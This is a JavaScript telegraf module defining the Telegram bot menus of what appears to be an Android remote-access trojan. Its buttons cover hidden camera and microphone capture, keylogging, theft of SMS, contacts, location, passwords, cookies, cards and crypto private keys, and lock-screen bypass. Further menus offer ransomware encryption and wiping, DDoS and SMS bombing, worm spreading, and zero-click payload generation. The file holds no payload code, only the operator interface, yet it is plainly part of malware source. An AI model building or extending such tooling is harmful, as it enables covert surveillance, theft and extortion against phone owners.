const { Markup } = require('telegraf');

class Keyboards {
    static getMainKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('📸📹 CAMERA (25)', 'section_camera')],
            [Markup.button.callback('🎙️🔊 AUDIO (20)', 'section_audio')],
            [Markup.button.callback('💡✨ FLASHLIGHT (15)', 'section_flash')],
            [Markup.button.callback('📳💫 VIBRATION (15)', 'section_vibe')],
            [Markup.button.callback('🌐📶 NETWORK (30)', 'section_network')],
            [Markup.button.callback('🔒🔓 SECURITY (25)', 'section_security')],
            [Markup.button.callback('💾📁 DATA EXTRACTION (30)', 'section_data')],
            [Markup.button.callback('📂🗃️ FILE MANAGER (25)', 'section_files')],
            [Markup.button.callback('🖥️📱 SCREEN (20)', 'section_screen')],
            [Markup.button.callback('📱⚙️ APPS (25)', 'section_apps')],
            [Markup.button.callback('⚙️🔧 SYSTEM (30)', 'section_system')],
            [Markup.button.callback('⌨️📝 KEYLOGGER (15)', 'section_keylog')],
            [Markup.button.callback('🌐🔍 BROWSER (20)', 'section_browser')],
            [Markup.button.callback('📱🌐 SOCIAL (15)', 'section_social')],
            [Markup.button.callback('💰🔐 CRYPTO (12)', 'section_crypto')],
            [Markup.button.callback('⚔️💀 DDOS (12)', 'section_ddos')],
            [Markup.button.callback('💀⚠️ RANSOMWARE (12)', 'section_ransom')],
            [Markup.button.callback('🪱🐛 SPREADER (12)', 'section_spreader')],
            [Markup.button.callback('🎯💀 ZERO-CLICK (20)', 'section_zero')],
            [Markup.button.callback('⚡🔧 EXTRA (20)', 'section_extra')],
            [Markup.button.callback('📊 STATISTICS', 'statistics')],
            [Markup.button.callback('❓ HELP', 'help')]
        ]);
    }
    
    static getCameraKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('📷 FRONT CAM', 'cam_front'), Markup.button.callback('📸 BACK CAM', 'cam_back'), Markup.button.callback('🔄 SWITCH', 'cam_switch')],
            [Markup.button.callback('🎥 VIDEO 10s', 'video_10'), Markup.button.callback('🎬 VIDEO 30s', 'video_30'), Markup.button.callback('🎞️ VIDEO 60s', 'video_60')],
            [Markup.button.callback('📸 BURST 5X', 'cam_burst'), Markup.button.callback('🌙 NIGHT MODE', 'cam_night'), Markup.button.callback('⚡ HDR', 'cam_hdr')],
            [Markup.button.callback('🔍 ZOOM 2X', 'cam_zoom'), Markup.button.callback('🔄 TIMELAPSE', 'cam_timelapse'), Markup.button.callback('🔒 STEALTH', 'cam_stealth')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }
    
    static getAudioKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('🎤 MIC START', 'mic_start'), Markup.button.callback('🎤 MIC STOP', 'mic_stop'), Markup.button.callback('🎙️ LIVE MIC', 'mic_live')],
            [Markup.button.callback('🔊 SPEAKER ON', 'speaker_on'), Markup.button.callback('🔇 SPEAKER OFF', 'speaker_off'), Markup.button.callback('📢 LOUD MODE', 'loud_mode')],
            [Markup.button.callback('🔊 VOL MAX', 'vol_max'), Markup.button.callback('🔉 VOL 50%', 'vol_50'), Markup.button.callback('🔈 VOL 0%', 'vol_0')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }
    
    static getFlashKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('💡 FLASH ON', 'flash_on'), Markup.button.callback('💡 FLASH OFF', 'flash_off'), Markup.button.callback('✨ STROBE', 'flash_strobe')],
            [Markup.button.callback('⚡ FAST STROBE', 'flash_fast'), Markup.button.callback('💥 SOS', 'flash_sos'), Markup.button.callback('🌈 RGB', 'flash_rgb')],
            [Markup.button.callback('🔆 BRIGHT 100%', 'bright_100'), Markup.button.callback('🔅 BRIGHT 50%', 'bright_50'), Markup.button.callback('🔅 BRIGHT 25%', 'bright_25')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }
    
    static getVibeKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('📳 VIBE 1s', 'vibe_1'), Markup.button.callback('📳 VIBE 3s', 'vibe_3'), Markup.button.callback('📳 VIBE 5s', 'vibe_5')],
            [Markup.button.callback('📳 VIBE 10s', 'vibe_10'), Markup.button.callback('📳 VIBE 30s', 'vibe_30'), Markup.button.callback('🎵 PATTERN', 'vibe_pattern')],
            [Markup.button.callback('🔁 LOOP', 'vibe_loop'), Markup.button.callback('💥 STRONG', 'vibe_strong'), Markup.button.callback('🌊 WAVE', 'vibe_wave')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }
    
    static getNetworkKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('📶 WIFI ON', 'wifi_on'), Markup.button.callback('📶 WIFI OFF', 'wifi_off'), Markup.button.callback('🔍 SCAN', 'wifi_scan')],
            [Markup.button.callback('🔑 WIFI PASS', 'wifi_password'), Markup.button.callback('🔐 WIFI CRACK', 'wifi_crack'), Markup.button.callback('📊 INFO', 'wifi_info')],
            [Markup.button.callback('📱 DATA ON', 'data_on'), Markup.button.callback('📱 DATA OFF', 'data_off'), Markup.button.callback('📊 USAGE', 'data_usage')],
            [Markup.button.callback('✈️ AIRPLANE', 'airplane_toggle'), Markup.button.callback('🔗 BLUETOOTH', 'bt_toggle'), Markup.button.callback('🌐 HOTSPOT', 'hotspot_on')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }
    
    static getSecurityKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('🔒 LOCK', 'lock'), Markup.button.callback('🔓 UNLOCK', 'unlock'), Markup.button.callback('⏭️ SLIDE', 'slide')],
            [Markup.button.callback('🔢 BYPASS PIN', 'bypass_pin'), Markup.button.callback('🔐 BYPASS PATTERN', 'bypass_pattern'), Markup.button.callback('🔑 BYPASS PASS', 'bypass_pass')],
            [Markup.button.callback('🔄 BYPASS FINGER', 'bypass_finger'), Markup.button.callback('👁️ BYPASS FACE', 'bypass_face'), Markup.button.callback('🔓 BYPASS ALL', 'bypass_all')],
            [Markup.button.callback('🔐 CHANGE PIN', 'change_pin'), Markup.button.callback('💀 FACTORY RESET', 'factory_reset')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }
    
    static getDataKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('💬 SMS', 'get_sms'), Markup.button.callback('📞 CALLS', 'get_calls'), Markup.button.callback('👥 CONTACTS', 'get_contacts')],
            [Markup.button.callback('🌍 LOCATION', 'get_location'), Markup.button.callback('📍 GPS TRACK', 'gps_track'), Markup.button.callback('🗺️ MAP', 'map_view')],
            [Markup.button.callback('📸 PHOTOS', 'get_photos'), Markup.button.callback('🎥 VIDEOS', 'get_videos'), Markup.button.callback('🎵 AUDIO', 'get_audio')],
            [Markup.button.callback('📄 DOCS', 'get_docs'), Markup.button.callback('📦 APK', 'get_apk'), Markup.button.callback('🔑 PASSWORDS', 'get_passwords')],
            [Markup.button.callback('🍪 BROWSER', 'get_browser'), Markup.button.callback('📱 WHATSAPP', 'get_whatsapp'), Markup.button.callback('📘 FACEBOOK', 'get_facebook')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }
    
    static getFileKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('📁 MANAGER', 'file_manager'), Markup.button.callback('📥 DOWNLOAD', 'download_file'), Markup.button.callback('📤 UPLOAD', 'upload_file')],
            [Markup.button.callback('🗑️ DELETE', 'delete_file'), Markup.button.callback('📋 COPY', 'copy_file'), Markup.button.callback('✂️ MOVE', 'move_file')],
            [Markup.button.callback('📝 RENAME', 'rename_file'), Markup.button.callback('🔐 ZIP', 'zip_file'), Markup.button.callback('🔓 UNZIP', 'unzip')],
            [Markup.button.callback('🔒 ENCRYPT', 'encrypt_file'), Markup.button.callback('🔓 DECRYPT', 'decrypt_file'), Markup.button.callback('🔍 SEARCH', 'search_files')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }
    
    static getScreenKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('📸 SCREENSHOT', 'screenshot'), Markup.button.callback('🎥 SCREEN REC', 'screen_rec'), Markup.button.callback('⏹️ STOP', 'screen_rec_stop')],
            [Markup.button.callback('🎥 REC 30s', 'screen_rec_30'), Markup.button.callback('🎥 REC 60s', 'screen_rec_60'), Markup.button.callback('🎥 REC 300s', 'screen_rec_300')],
            [Markup.button.callback('🖼️ WALLPAPER', 'wallpaper'), Markup.button.callback('🔆 BRIGHT UP', 'bright_up'), Markup.button.callback('🔅 BRIGHT DOWN', 'bright_down')],
            [Markup.button.callback('🌙 DARK MODE', 'dark_mode'), Markup.button.callback('☀️ LIGHT MODE', 'light_mode'), Markup.button.callback('📱 SCREEN ON/OFF', 'screen_toggle')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }
    
    static getAppsKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('📋 INSTALLED', 'list_apps'), Markup.button.callback('🚀 OPEN APP', 'open_app'), Markup.button.callback('❌ UNINSTALL', 'uninstall_app')],
            [Markup.button.callback('🔄 FORCE STOP', 'force_stop'), Markup.button.callback('⚡ CLEAR DATA', 'clear_app_data'), Markup.button.callback('🗑️ CLEAR CACHE', 'clear_cache')],
            [Markup.button.callback('📦 INSTALL APK', 'install_apk'), Markup.button.callback('🔒 HIDE APP', 'hide_app'), Markup.button.callback('🔓 UNHIDE', 'unhide_app')],
            [Markup.button.callback('📊 USAGE', 'app_usage'), Markup.button.callback('🚫 BLOCK', 'block_app'), Markup.button.callback('🔧 SYSTEM APPS', 'system_apps')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }
    
    static getSystemKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('ℹ️ INFO', 'sysinfo'), Markup.button.callback('🔋 BATTERY', 'battery'), Markup.button.callback('💾 RAM', 'ram_info')],
            [Markup.button.callback('📀 STORAGE', 'storage'), Markup.button.callback('🌡️ TEMP', 'temperature'), Markup.button.callback('📊 CPU', 'cpu_info')],
            [Markup.button.callback('🔐 ROOT', 'root_status'), Markup.button.callback('🔋 SAVE', 'battery_save'), Markup.button.callback('⚡ PERFORMANCE', 'performance')],
            [Markup.button.callback('🔄 REBOOT', 'reboot'), Markup.button.callback('⏻ POWER OFF', 'poweroff'), Markup.button.callback('💀 RESET', 'factory_reset_sys')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }
    
    static getKeylogKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('⌨️ START', 'keylog_start'), Markup.button.callback('⌨️ STOP', 'keylog_stop'), Markup.button.callback('📋 GET', 'keylog_get')],
            [Markup.button.callback('📊 STATS', 'keylog_stats'), Markup.button.callback('🗑️ CLEAR', 'keylog_clear'), Markup.button.callback('📤 UPLOAD', 'keylog_upload')],
            [Markup.button.callback('🔑 CAPTURE PASS', 'keylog_pass'), Markup.button.callback('💳 CARDS', 'keylog_cards'), Markup.button.callback('📧 EMAIL', 'keylog_email')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }
    
    static getBrowserKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('📜 HISTORY', 'browser_history'), Markup.button.callback('🔖 BOOKMARKS', 'browser_bookmarks'), Markup.button.callback('🍪 COOKIES', 'browser_cookies')],
            [Markup.button.callback('🔑 PASSWORDS', 'browser_passwords'), Markup.button.callback('💳 CARDS', 'browser_cards'), Markup.button.callback('📝 AUTOFILL', 'browser_autofill')],
            [Markup.button.callback('🗑️ CLEAR', 'browser_clear'), Markup.button.callback('🌐 OPEN URL', 'browser_open'), Markup.button.callback('📥 DOWNLOADS', 'browser_downloads')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }
    
    static getSocialKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('📘 FACEBOOK', 'fb_data'), Markup.button.callback('📷 INSTAGRAM', 'ig_data'), Markup.button.callback('💬 WHATSAPP', 'wa_data')],
            [Markup.button.callback('🐦 TWITTER', 'twitter_data'), Markup.button.callback('📱 TELEGRAM', 'tg_data'), Markup.button.callback('🎵 TIKTOK', 'tiktok_data')],
            [Markup.button.callback('🔑 PASSWORDS', 'social_pass'), Markup.button.callback('📜 HISTORY', 'social_history'), Markup.button.callback('🍪 COOKIES', 'social_cookies')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }
    
    static getCryptoKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('💰 BITCOIN', 'btc_wallet'), Markup.button.callback('💎 ETHEREUM', 'eth_wallet'), Markup.button.callback('🪙 BINANCE', 'binance_data')],
            [Markup.button.callback('📊 BALANCE', 'crypto_balance'), Markup.button.callback('🔑 PRIVATE KEYS', 'private_keys'), Markup.button.callback('📜 TX', 'crypto_tx')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }
    
    static getDdosKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('🌐 HTTP FLOOD', 'http_flood'), Markup.button.callback('📡 UDP FLOOD', 'udp_flood'), Markup.button.callback('🔌 TCP FLOOD', 'tcp_flood')],
            [Markup.button.callback('📱 SMS BOMB', 'sms_bomb'), Markup.button.callback('📞 CALL BOMB', 'call_bomb'), Markup.button.callback('🔗 STOP', 'ddos_stop')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }
    
    static getRansomKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('🔒 ENCRYPT', 'ransom_encrypt'), Markup.button.callback('🔓 DECRYPT', 'ransom_decrypt'), Markup.button.callback('💰 NOTE', 'ransom_note')],
            [Markup.button.callback('🗑️ WIPE DATA', 'wipe_data'), Markup.button.callback('📱 WIPE SD', 'wipe_sd'), Markup.button.callback('💀 DESTROY', 'destroy_system')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }
    
    static getSpreaderKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('📱 SPREAD CONTACTS', 'spread_contacts'), Markup.button.callback('🔗 SPREAD LINK', 'spread_link'), Markup.button.callback('📲 SPREAD BT', 'spread_bt')],
            [Markup.button.callback('🪱 WORM MODE', 'worm_mode'), Markup.button.callback('📡 AUTO SPREAD', 'auto_spread')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }
    
    static getZeroClickKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('📱 GEN PAYLOAD', 'gen_payload'), Markup.button.callback('📸 GEN JPG', 'gen_jpg'), Markup.button.callback('🎵 GEN MP3', 'gen_mp3')],
            [Markup.button.callback('🎥 GEN MP4', 'gen_mp4'), Markup.button.callback('📄 GEN PDF', 'gen_pdf'), Markup.button.callback('📱 GEN APK', 'gen_apk')],
            [Markup.button.callback('🔗 GEN LINK', 'gen_link'), Markup.button.callback('🔗 GEN QR', 'gen_qr'), Markup.button.callback('📤 SEND WA', 'send_wa')],
            [Markup.button.callback('📊 STATUS', 'check_status'), Markup.button.callback('🎯 EXPLOIT DB', 'exploit_db'), Markup.button.callback('🔍 VULN SCAN', 'vuln_scan')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }
    
    static getExtraKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('🔋 BATTERY SAVE', 'battery_save'), Markup.button.callback('⚡ PERFORMANCE', 'performance'), Markup.button.callback('🧹 CLEAN JUNK', 'clean_junk')],
            [Markup.button.callback('📡 SENSORS', 'sensors'), Markup.button.callback('🔍 PORT SCAN', 'port_scan'), Markup.button.callback('🌐 IP INFO', 'ip_info')],
            [Markup.button.callback('🔑 PASSWORD CRACK', 'password_crack'), Markup.button.callback('📡 MITM', 'mitm_attack'), Markup.button.callback('🔍 PACKET SNIFF', 'packet_sniff')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }
    
    static getBackKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('🔙 BACK TO MAIN', 'back_main')]
        ]);
    }
}

module.exports = Keyboards;
